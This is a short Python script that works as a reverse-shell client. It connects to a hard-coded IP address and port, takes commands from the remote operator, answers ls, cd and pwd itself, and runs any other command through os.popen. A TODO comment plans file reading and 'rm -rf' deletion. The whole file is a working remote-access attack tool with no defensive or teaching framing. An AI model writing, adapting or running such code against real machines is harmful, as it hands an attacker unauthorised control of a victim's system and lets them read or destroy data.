import socket
import subprocess
import re
import os

s = socket.socket()
HOST = "192.168.1.30"
PORT = 5051
SERVER = (HOST, PORT)
FORMAT = "utf-8"
BUFFER = 1024
DC_MSG = "!dc"
s.connect(SERVER)

def getPWD():
    pwd = f'{os.getcwd()}'
    return pwd

### TODO ###
# ls | grep
# cat /path/to/file
# rm 
# rm -rf


run = True
while run:
    cmd = s.recv(BUFFER).decode(FORMAT)
    if cmd == DC_MSG:
        run = False
    elif re.search("^ls\s?", cmd):
        lsItems = ""
        lsDir = cmd.replace("ls", "")
        lsDir = lsDir.replace(" ", "")
        if len(lsDir) > 1:
            ls = os.listdir(lsDir)
        else:
            ls = os.listdir()

        for item in ls:
            lsItems += item + "\t"
        s.send(lsItems.encode(FORMAT))
    elif re.search("^cd ", cmd):
        newCmd = cmd.replace("cd ", "")
        os.chdir(newCmd)
        crrDir = f"Current dir: {getPWD()} \n"
        s.send(crrDir.encode(FORMAT))
    elif re.search("^pwd$", cmd):
        # pwd = f'{os.getcwd()} \n'
        pwd = getPWD()+"\n"
        s.send(pwd.encode(FORMAT))
        
    else:
        os.popen(cmd)

    s.send("Client online ....".encode(FORMAT))

